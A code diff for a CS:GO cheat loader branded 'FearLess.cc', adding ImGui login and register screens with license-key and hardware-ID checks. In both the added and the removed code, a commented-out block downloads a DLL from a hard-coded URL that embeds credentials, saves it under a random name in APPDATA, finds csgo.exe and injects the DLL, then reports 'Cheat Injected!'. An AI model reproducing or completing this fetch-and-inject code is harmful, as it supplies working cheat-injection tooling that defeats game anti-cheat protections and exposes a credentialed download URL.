@@ -37,8 +37,8 @@
 #include <mysql.h>
 #pragma comment(lib, "d3d9.lib")
 #define DIRECTINPUT_VERSION 0x0800
-#define LOADERW 314
-#define LOADERH 268
+#define LOADERW 320
+#define LOADERH 280
 #include <iostream>
 #include <dinput.h>
 #include <tchar.h>
@@ -57,11 +57,14 @@
 
 static char buf[17] = { 0 };
 static char pass[17] = { 0 };
-static char inv[17] = { 0 };
+static char registerinvp[17] = { 0 };
+static char passregisterp[17] = { 0 };
+static char userregisterp[17] = { 0 };
 static std::string key;
 static std::string passy;
 static bool testCheckbox = false;
 #include <comdef.h>  // you will need this
+#include "hihihihhihi.h"
 
 static HANDLE GetProcessByName(const wchar_t* name)
 {
@@ -382,11 +385,128 @@ int Authorization(std::string name, std::string pass)
 
 }
 
+void renderpizda()
+{
+    ImGui::SetCursorPos(ImVec2(307 / 2 - ImGui::CalcTextSize(xorstr("FearLess.cc")).x / 2, 15));
+    ImGui::Text(xorstr("FearLess.cc"));
+    ImGui::SetCursorPos(ImVec2(66, 81));
+    ImGui::Text(xorstr("UserName"));
+    ImGui::PushItemWidth(177);
+    ImGui::SetCursorPos(ImVec2(64, 100));
+    ImGui::InputText(xorstr("###Key"), buf, IM_ARRAYSIZE(buf));
+    ImGui::PopItemWidth();
+
+
+    ImGui::SetCursorPos(ImVec2(66, 120));
+    ImGui::Text(xorstr("Password"));
+    ImGui::PushItemWidth(177);
+    ImGui::SetCursorPos(ImVec2(64, 140));
+    ImGui::InputText(xorstr("###Pass"), pass, IM_ARRAYSIZE(pass), ImGuiInputTextFlags_Password);
+    ImGui::PopItemWidth();
+
+    ImGui::SetCursorPos(ImVec2(64, 165));
+    if (ImGui::Button(xorstr("Login"), ImVec2(177, 21))) {
+        key = buf;
+        passy = pass;
+        ////printf(key.c_str());
+        ////printf(passy.c_str());
+        //std::wstring stemp = s2ws(key);
+        //LPCWSTR result = stemp.c_str();
+        //std::wstring stemp1 = s2ws(passy);
+        //LPCWSTR result1 = stemp1.c_str();
+        //MessageBox(0, result, L"Success", MB_OK);
+        //MessageBox(0, result1, L"Success", MB_OK);
+
+        //std::wstring stemp11 = s2ws(currentDateTime());
+        //LPCWSTR result11 = stemp11.c_str();
+        //MessageBox(0, result11, L"Success", MB_OK);
+
+
+        std::chrono::system_clock::now();
+
+
+        if (Authorization(key, passy) == 1) {
+            //const char* alphabet = "qwertyuiopasdfghjklzxcvbnm0123456789";
+            //HINTERNET hInternet = InternetOpen(skCrypt(L"тут ваше название"), INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, 0);
+            //if (!hInternet) { InternetCloseHandle(hInternet); return 0; }
+            //LPCWSTR query = skCrypt(L"https://sidesense.eu/");
+
+            //HINTERNET hUrl = InternetOpenUrl(hInternet, query, 0, 0, 0, 0);
+            //std::string EndFile = getenv(skCrypt("APPDATA"));
+            //EndFile += xorstr("\\");
+            //for (int i = 0; i < 12; i++)
+            //{
+            //    EndFile += alphabet[abs(int(rand()) % 36)];
+            //}
+            //EndFile += xorstr(".dll");
+            //DeleteUrlCacheEntry(skCrypt(L"https://HxInbgoiduGIngo:Jfgnbdiwhgonedhg@sidesense.eu/main/imaratforurpcccccc1234io1uJKFDHOIAFANL.dll"));
+            //if (URLDownloadToFileA(0, skCrypt("https://HxInbgoiduGIngo:Jfgnbdiwhgonedhg@sidesense.eu/main/imaratforurpcccccc1234io1uJKFDHOIAFANL.dll"), EndFile.c_str(), 0, 0) != S_OK) { InternetCloseHandle(hInternet); InternetCloseHandle(hUrl); return 0; }      // скачиваем dll
+            //HANDLE hProc = GetProcessByName(skCrypt(L"csgo.exe"));
+            //if (!hProc || hProc == 0) { InternetCloseHandle(hInternet); InternetCloseHandle(hUrl); return 0; }
+
+            //if (Inject(EndFile.c_str(), hProc)) { InternetCloseHandle(hInternet); InternetCloseHandle(hUrl); return 0; }
+            //InternetCloseHandle(hInternet);
+            //InternetCloseHandle(hUrl);
+            MessageBox(0, L"Cheat Injected!", L"Success", MB_OK);
+        }
+        else if (Authorization(key, passy) == 2)
+        {
+            MessageBox(0, L"Hwid incorrect", L"Error", MB_ICONERROR);
+
+        }
+        else if (Authorization(key, passy) == 4)
+        {
+            MessageBox(0, L"Expired!", L"Error", MB_ICONERROR);
+
+        }
+        else if (Authorization(key, passy) == 3)
+        {
+            MessageBox(0, L"Key not found", L"Error", MB_ICONERROR);
+
+        }
+
+    }
+}
+
+void renderr()
+{
+    ImGui::SetCursorPos(ImVec2(307 / 2 - ImGui::CalcTextSize(xorstr("FearLess.cc")).x / 2, 15));
+    ImGui::Text(xorstr("FearLess.cc"));
+    ImGui::SetCursorPos(ImVec2(66, 81));
+    ImGui::Text(xorstr("UserName"));
+    ImGui::PushItemWidth(177);
+    ImGui::SetCursorPos(ImVec2(64, 100));
+    ImGui::InputText(xorstr("###User"), userregisterp, IM_ARRAYSIZE(userregisterp));
+    ImGui::PopItemWidth();
+
+
+    ImGui::SetCursorPos(ImVec2(66, 120));
+    ImGui::Text(xorstr("Password"));
+    ImGui::PushItemWidth(177);
+    ImGui::SetCursorPos(ImVec2(64, 140));
+    ImGui::InputText(xorstr("###Pass"), passregisterp, IM_ARRAYSIZE(passregisterp));
+    ImGui::PopItemWidth();
+
+    ImGui::SetCursorPos(ImVec2(68, 160));
+    ImGui::Text(xorstr("Invite"));
+    ImGui::PushItemWidth(177);
+    ImGui::SetCursorPos(ImVec2(64, 180));
+    ImGui::InputText(xorstr("###Inv"), registerinvp, IM_ARRAYSIZE(registerinvp));
+    ImGui::PopItemWidth();
+
+    ImGui::SetCursorPos(ImVec2(64, 207));
+    if (ImGui::Button(xorstr("Register"), ImVec2(177, 21))) {
+        // nothingM do register here
+
+    }
+}
 
 int WINAPI WinMain(HINSTANCE, HINSTANCE, PSTR, int)
 {
 
     
+    // Create application window
+    //ImGui_ImplWin32_EnableDpiAwareness();
     WNDCLASSEX wc = { sizeof(WNDCLASSEX), CS_CLASSDC, WndProc, 0L, 0L, GetModuleHandle(NULL), NULL, NULL, NULL, NULL, _T("FearLess.cc"), NULL };
     ::RegisterClassEx(&wc);
     int x = GetSystemMetrics(SM_CXSCREEN) / 2 - LOADERW / 2; // cetner screen x
@@ -408,7 +528,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, PSTR, int)
     IMGUI_CHECKVERSION();
     ImGui::CreateContext();
     ImGuiIO& io = ImGui::GetIO();
-    io.Fonts->AddFontFromFileTTF("C:\\Windows\\Fonts\\Tahoma.ttf", 16);
+    io.Fonts->AddFontFromFileTTF("C:\\Windows\\Fonts\\Verdana.ttf", 11);
     ImGui::GetStyle().WindowRounding = 0.0f;
     ImGui::GetStyle().WindowPadding = ImVec2(0.0f, 0.0f);
     ImGui::GetStyle().ChildRounding = 0.0f;
@@ -416,17 +536,9 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, PSTR, int)
     ImGui::GetStyle().WindowTitleAlign = ImVec2(0.5, 0.5);
     ImGui::GetStyle().PopupBorderSize = 0.0f;
 
-    ImVec4* colors = ImGui::GetStyle().Colors;
-    colors[ImGuiCol_WindowBg] = ImColor(33, 33, 33, 215);//zochem? ia zhe ubral bg?
-    colors[ImGuiCol_ChildBg] = ImColor(21, 20, 21, 255);
-    colors[ImGuiCol_ResizeGrip] = ImColor(42, 40, 43, 0);
-    colors[ImGuiCol_ResizeGripHovered] = ImColor(42, 40, 43, 0);
-    colors[ImGuiCol_ResizeGripActive] = ImColor(42, 40, 43, 0);
-    colors[ImGuiCol_Border] = ImColor(38, 39, 55, 215);
-    colors[ImGuiCol_Button] = ImColor(29, 125, 229, 5);
-    colors[ImGuiCol_ButtonHovered] = ImColor(29, 125, 229, 5);
-    colors[ImGuiCol_ButtonActive] = ImColor(29, 125, 229, 5);
-    colors[ImGuiCol_PopupBg] = ImColor(18, 17, 18, 255);
+   // LamantineSDK::InitFonts();
+    LamantineSDK::InitStyles();
+    LamantineSDK::ColorStyles();
 
     ImGui_ImplWin32_Init(hwnd);
     ImGui_ImplDX9_Init(g_pd3dDevice);
@@ -450,99 +562,36 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, PSTR, int)
         ImGui::NewFrame();
 
         {
-
             ImGui::SetNextWindowPos(ImVec2(0, 0));
             ImGui::SetNextWindowSize(ImVec2(LOADERW, LOADERH));
-            ImGui::Begin(xorstr("FearLess.cc"), &opened, ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoSavedSettings | ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoTitleBar | ImGuiWindowFlags_NoMove | ImGuiWindowFlags_NoBackground); // Create a window called "Hello, world!" and append into it.
+            ImGui::Begin("FearLess.cc", &opened, ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoSavedSettings | ImGuiWindowFlags_NoTitleBar); // Create a window called "Hello, world!" and append into it.
 
-            ImGui::GetWindowDrawList()->AddRectFilled(ImVec2(), ImVec2(LOADERW, LOADERH), ImColor(50, 50, 60));
-            ImGui::GetWindowDrawList()->AddRect(ImVec2(), ImVec2(LOADERW, LOADERH), ImColor(188, 188, 188, 50));
-            ImGui::GetWindowDrawList()->AddRectFilled(ImVec2(7, 9), ImVec2(307, 259), ImColor(31, 31, 31));
-            //   ImGui::GetWindowDrawList()->AddRect(ImVec2(7, 9), ImVec2(307, 259), ImColor(188, 188, 188, 50));
-            ImGui::GetWindowDrawList()->AddRectFilledMultiColor(ImVec2(21, 38), ImVec2(294, 43), ImColor(78, 129, 181), ImColor(94, 175, 255), ImColor(64, 159, 255), ImColor(64, 159, 255));
-            //  ImGui::GetWindowDrawList()->AddRectFilled(ImVec2(21, 54), ImVec2(294, 237), ImColor(22, 22, 22));
-            //  ImGui::GetWindowDrawList()->AddRect(ImVec2(21, 54), ImVec2(294, 237), ImColor(188, 188, 188, 50));
+            ImGui::SetCursorPos(ImVec2(0, 0));
+            ImGui::GetWindowDrawList()->AddRectFilled(ImVec2(), ImVec2(55, 540), ImColor(46, 46, 72));
 
-            ImGui::SetCursorPos(ImVec2(307 / 2 - ImGui::CalcTextSize(xorstr("FearLess.cc")).x / 2, 15));
-            ImGui::Text(xorstr("FearLess.cc"));
-            ImGui::SetCursorPos(ImVec2(66, 81));
-            ImGui::Text(xorstr("UserName"));
-            ImGui::PushItemWidth(177);
-            ImGui::SetCursorPos(ImVec2(64, 100));
-            ImGui::InputText(xorstr("###Key"), buf, IM_ARRAYSIZE(buf));
-            ImGui::PopItemWidth();
-
-
-            ImGui::SetCursorPos(ImVec2(66, 120));
-            ImGui::Text(xorstr("Password"));
-            ImGui::PushItemWidth(177);
-            ImGui::SetCursorPos(ImVec2(64, 140));
-            ImGui::InputText(xorstr("###Pass"), pass, IM_ARRAYSIZE(pass), ImGuiInputTextFlags_Password);
-            ImGui::PopItemWidth();
-
-            ImGui::SetCursorPos(ImVec2(64, 165));
-            if (ImGui::Button(xorstr("Load"), ImVec2(177, 21))) {
-                key = buf;
-                passy = pass;
-                ////printf(key.c_str());
-                ////printf(passy.c_str());
-                //std::wstring stemp = s2ws(key);
-                //LPCWSTR result = stemp.c_str();
-                //std::wstring stemp1 = s2ws(passy);
-                //LPCWSTR result1 = stemp1.c_str();
-                //MessageBox(0, result, L"Success", MB_OK);
-                //MessageBox(0, result1, L"Success", MB_OK);
-
-                //std::wstring stemp11 = s2ws(currentDateTime());
-                //LPCWSTR result11 = stemp11.c_str();
-                //MessageBox(0, result11, L"Success", MB_OK);
-
-
-                std::chrono::system_clock::now();
-
-
-                if (Authorization(key, passy) == 1) {
-                    //const char* alphabet = "qwertyuiopasdfghjklzxcvbnm0123456789";
-                    //HINTERNET hInternet = InternetOpen(skCrypt(L"тут ваше название"), INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, 0);
-                    //if (!hInternet) { InternetCloseHandle(hInternet); return 0; }
-                    //LPCWSTR query = skCrypt(L"https://sidesense.eu/");
-
-                    //HINTERNET hUrl = InternetOpenUrl(hInternet, query, 0, 0, 0, 0);
-                    //std::string EndFile = getenv(skCrypt("APPDATA"));
-                    //EndFile += xorstr("\\");
-                    //for (int i = 0; i < 12; i++)
-                    //{
-                    //    EndFile += alphabet[abs(int(rand()) % 36)];
-                    //}
-                    //EndFile += xorstr(".dll");
-                    //DeleteUrlCacheEntry(skCrypt(L"https://HxInbgoiduGIngo:Jfgnbdiwhgonedhg@sidesense.eu/main/imaratforurpcccccc1234io1uJKFDHOIAFANL.dll"));
-                    //if (URLDownloadToFileA(0, skCrypt("https://HxInbgoiduGIngo:Jfgnbdiwhgonedhg@sidesense.eu/main/imaratforurpcccccc1234io1uJKFDHOIAFANL.dll"), EndFile.c_str(), 0, 0) != S_OK) { InternetCloseHandle(hInternet); InternetCloseHandle(hUrl); return 0; }      // скачиваем dll
-                    //HANDLE hProc = GetProcessByName(skCrypt(L"csgo.exe"));
-                    //if (!hProc || hProc == 0) { InternetCloseHandle(hInternet); InternetCloseHandle(hUrl); return 0; }
-
-                    //if (Inject(EndFile.c_str(), hProc)) { InternetCloseHandle(hInternet); InternetCloseHandle(hUrl); return 0; }
-                    //InternetCloseHandle(hInternet);
-                    //InternetCloseHandle(hUrl);
-                    MessageBox(0, L"Cheat Injected!", L"Success", MB_OK);
-                }
-                else if (Authorization(key, passy) == 2)
-                {
-                    MessageBox(0, L"Hwid incorrect", L"Error", MB_ICONERROR);
-
-                }
-                else if (Authorization(key, passy) == 4)
-                {
-                    MessageBox(0, L"Expired!", L"Error", MB_ICONERROR);
-
-                }
-                else if (Authorization(key, passy) == 3)
-                {
-                    MessageBox(0, L"Key not found", L"Error", MB_ICONERROR);
-
-                }
+            ImGui::SetCursorPos(ImVec2(0, 40));
+            ImGui::BeginGroup(); {
+                ImGui::Spacing();
+                LamantineSDK::tab("Login", 0, "Login");
+                ImGui::Spacing();
+                LamantineSDK::tab("Register", 1, "Register");
+                ImGui::Spacing();
             }
+            ImGui::EndGroup();
+            switch (active_tab) {
+            case 0:
+                renderpizda();
+                break;
+            case 1:
+                renderr();
+                break;
+            }
+
             ImGui::End();
         }
+
+
+        // Rendering
         ImGui::EndFrame();
         g_pd3dDevice->SetRenderState(D3DRS_ZENABLE, FALSE);
         g_pd3dDevice->SetRenderState(D3DRS_ALPHABLENDENABLE, FALSE);
@@ -556,6 +605,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, PSTR, int)
         }
         HRESULT result = g_pd3dDevice->Present(NULL, NULL, NULL, NULL);
 
+        // Handle loss of D3D9 device
         if (result == D3DERR_DEVICELOST && g_pd3dDevice->TestCooperativeLevel() == D3DERR_DEVICENOTRESET)
             ResetDevice();
 
